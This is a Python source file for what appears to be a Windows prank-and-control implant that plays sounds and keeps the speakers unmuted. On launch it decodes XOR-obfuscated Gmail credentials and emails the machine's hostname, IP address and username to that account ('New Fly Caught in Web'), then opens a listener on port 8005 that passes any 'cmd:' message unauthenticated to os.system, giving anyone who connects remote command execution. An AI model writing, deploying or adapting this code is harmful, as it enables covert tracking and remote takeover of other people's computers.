# server aka recieve
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import random as rand
from ctypes import cast, POINTER
import ctypes
import os
import winsound
import socket
import smtplib 
import asyncio
import time
from multiprocessing import Process

os.chdir(os.path.dirname(os.path.abspath(__file__)))

with open("cipher.txt","r") as file:
    xor_key = file.read().strip()
    file.close()

def run():
    for x in range(3):
        winsound.Beep(3000,50)

with open("first.txt" , "r") as file:
    x = file.read().strip()
    if x == "0":
        run()
        with open("first.txt","w") as file_2:
            file_2.write("1")
    else:
        print("silent")

def xor_cipher(text, key):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(text))

def spider_web():
    with open("email.txt", "r") as file:
        email = file.read().strip()
        email_name = xor_cipher(email, xor_key)
        file.close()
    with open("key.txt", "r") as key:
        passw = key.read().strip()
        deobfuscated_key = xor_cipher(passw, xor_key)
        key.close()    

    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
    user = os.getlogin()
    subject = "New Fly Caught in Web"
    body = f"Fly Caught Hostname: {hostname} Ip: {ip} Username: {user}"
    email_message = f"Subject: {subject}\n\n{body}"
    try:
        server = smtplib.SMTP_SSL("smtp.gmail.com",465)
        server.login(email_name,deobfuscated_key)
        server.sendmail(email_name,email_name,email_message)
        server.quit()
    except Exception as e:
        print(f"Error: {e}")
spider_web()

folder_path = "Audio/"
filenames_1 = os.listdir(folder_path)
filenames = []

for file_name in filenames_1:
    filenames.append(file_name.split(".")[0])

devices = AudioUtilities.GetSpeakers()
interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL , None)
volume = cast(interface, POINTER(IAudioEndpointVolume))
os.chdir(os.path.dirname(os.path.realpath(__file__)))

def make_noise(specific_noise):
    volume.SetMasterVolumeLevel(-2.0, None)
    volume.SetMute(0, None)
    if specific_noise:
        try:
            winsound.PlaySound("audio/" + specific_noise,winsound.SND_FILENAME)
        except Exception as Error:
            print(f"Error occured{Error}")
    else:
        try:
            winsound.PlaySound("audio/" + filenames[rand.randint(0,len(filenames)-1)], winsound.SND_FILENAME)
        except Exception as Error:
            print(f"Error occured{Error}") 

def process_data(data):
    if data:
        response = f"Recieved:{data}"
        return response
    return ""

def start_server(host="0.0.0.0",port=8005):
    with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as server_socket:
        server_socket.bind((host,port))
        server_socket.listen(1)
        print(f"Listening on {host}")
        while True:
            conn, addr = server_socket.accept()
            with conn:
                print("Connected by ", addr)
                data = conn.recv(1024).decode()
                data = data.lower()
                if not data:
                    continue
                print("Recieved Data:",data)
                if data == "random":
                    make_noise("")
                elif data in filenames:
                    make_noise(str(data))
                elif "cmd:" in data:
                    cmd = data.split("cmd:")[1]
                    os.system(str(cmd))
                    print(f"Exec CMD:{cmd}")       
                response = process_data(data)
                conn.sendall(response.encode())

def volume_1():
    while True:
        time.sleep(.5)
        print("unmuting")
        currentVolumeDb = volume.GetMasterVolumeLevel()
        volume.SetMasterVolumeLevel(-2.0, None)
        volume.SetMute(0, None)

def main():
    vol_process = Process(target=volume_1)
    server_process = Process(target=start_server)
    vol_process.start()
    server_process.start()
    vol_process.join()
    server_process.join()

if __name__ == "__main__":
    main()

 
